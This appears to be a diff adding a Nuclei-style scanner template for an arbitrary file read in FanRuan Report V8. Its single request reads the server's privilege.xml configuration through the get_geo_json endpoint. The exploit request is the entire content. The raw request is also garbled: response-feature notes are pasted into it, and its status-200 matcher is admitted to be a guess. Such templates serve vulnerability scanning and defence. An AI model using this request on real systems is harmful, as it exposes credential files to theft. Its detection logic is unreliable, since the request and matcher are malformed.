@@ -1,0 +1,36 @@
+id: poc-cwee00vg8h7li5fh
+info:
+  name: 帆软报表 V8 get_geo_json 任意文件读取漏洞
+  author: hacktwo
+  severity: high
+  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/cwee00vg8h7li5fh
+
+    [!] 推断说明: 状态码缺失, 推断为 200。原文响应特征为截图, 无法自动提取文本命中条件, 使用前请人工核验。'
+  tags: lfi,2024
+  metadata:
+    source: yuque-hacktwo-dtdx2v
+    doc-slug: cwee00vg8h7li5fh
+    fofa: 暂无
+http:
+- raw:
+  - 'GET /WebReport/ReportServer?op=chart&cmd=get_geo_json&resourcepath=privilege.xml  HTTP/1.1
+
+
+    # 响应代码特征
+
+    -1
+
+
+    # 响应内容特征
+
+    暂无
+
+
+    # 上传文件定位
+
+    暂无'
+  redirects: false
+  matchers:
+  - status:
+    - 200
+    type: status
